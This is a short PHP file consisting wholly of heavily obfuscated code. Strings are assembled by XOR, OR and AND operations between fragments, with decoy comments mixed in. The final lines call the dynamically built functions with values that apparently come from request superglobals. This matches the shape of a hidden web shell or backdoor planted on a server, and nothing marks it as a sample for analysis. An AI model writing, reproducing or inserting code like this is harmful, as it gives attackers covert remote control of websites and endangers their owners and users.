<?php
$PhpdV='dVx6'|_j2UUSUOe;$ROhpbeqd=')`'.Mq42B.'%1!s'^mEkPpS.'"'.QPa5;$F6='+Yj'^#Tut2ZK'.
       'f}O';$igxJXKJHi='P2@P$KK4",@ '.UN0P.'(#  '|'D5@P AJ;)B@"@Z0X( )0';$ADvr='U:,^'.
       'VM'^'!'.NGmfp;$Coj8EdrI='o0B]9HHp/jI^H_.'.xaeH.' '.q4EhMOTORMl.'#'^RWqh.#RYiQ'.
       ']"'.uCDU.'|)'.qiCCXR.'>'.WEQ5W.'<|'.czk6.'[X';$QmwY2G='=(H['|'p*AY';'on1hsVSi'.
       'v^,_R';$CfT7UDy0GPG='g}TN'^'562p';$lNCpRId='`@)L0`@5E '|'Ie)*0"^ K"';$r4=#AxB'.
       'T>@'^'1zt';$wppsO='we}wow'&gouun.'~';$SD_SuPzGr3z='1'^T;$yv1_='{'&'|';'FXrUI0'.
       'I!+~H~<D';$IRRi1A=i&'{';$Wpx=p|t;$xtMT=O^'.';$cOF='ONO/jQ'^'?<*H5#';$LQYD=#ey'.
       'Y$8'^')HY';$zenOQ7gL_='0'^S;$_LrFseLt7Do='N^'.Vt_Y_.']'.s_DmVCA.'|_SC^gON'&#T'.
       'xu]Y_~'._WX__GVkIQ_s_SMeo;$bGWg=_CH&_OY;$FGZOLH4ACx='@R'|AP;$jQdm_FVmk=k^#eCm'.
       '8';$FPlV6WE4=('xq~'.VnSYT.'%+*'&'l`'.UDo_NLgm.'*')|$ROhpbeqd;$zz1=$F6|$r4;'iF'.
       'Iv_xRUF:l_';$Qu4YDJO=$wppsO&('ou}m~w'&'og~}~w');$V3zOPVr=(uRdGO.'>l`<j#E'&#aK'.
       'xz|'.k_r5p.'*`7o')|('x3}%'._ZCuvasf&'p<g<'._vUpeuo.'%');$zF=(h8tq.' ]F"jBp`k|'.
       '/La6*g'^_nXM.'[c~'.x3sV7PA.'@u;gb.')^$igxJXKJHi;$MjYm=$ADvr^('nfJ/%E'^/*eAcOC'.
       'o*/RFuLJ9);$t5V66Mc=$Coj8EdrI&('60];<v3!@Ih")(%(0"@c<!>5Eaq!Xc 4'|'%'./*H5gua'.
       ']dB8*/Tm5td46eq.';730'.s9S3m.'"4'.D95ax.'"R}a46');$eRJlnvj3BCB=$QmwY2G^/*GZ4P'.
       'JX8e%G3V=*/$CfT7UDy0GPG;$NrGgUmN=$lNCpRId^('&x4~Pn]$N,'^fFkO6Q."*bdg");'zB8lk'.
       'X_oU#';$UzW=(ES9acf.'`s_@'.C3ex.']'.MHXJtY2.'^xV}>='|'$'.CzqAeQ3UX.'@'./*rfLy'.
       '7,*/WclRbLQFLE3.':C^e=(')&(')('.MuXsyS88z.'!Vj!Z,j=UP]+H("Eh'^'Tg|'.D78D.'`AE'.
       '(V"3O5@2c8+b}5'.sq8U);!$FPlV6WE4($zz1($Qu4YDJO($MjYm)),$t5V66Mc)||$V3zOPVr(/*'.
       '47*/$eRJlnvj3BCB,$SD_SuPzGr3z.$yv1_.$IRRi1A.$Wpx,$xtMT);$zF($cOF./*aSmR7za9AF'.
       'GegB{Tf-*/$SD_SuPzGr3z.$LQYD.$zenOQ7gL_.$SD_SuPzGr3z,array($NrGgUmN,/*mb4GRYX'.
       'k[jMG{*/$Qu4YDJO($_LrFseLt7Do.$bGWg.$FGZOLH4ACx.$jQdm_FVmk),$UzW));# kies&_7'.
       '<F^K%m<evB2h,4FX~s:?Ji9[Tp?At{z?3yD98eu3+N4kD>G|c! ';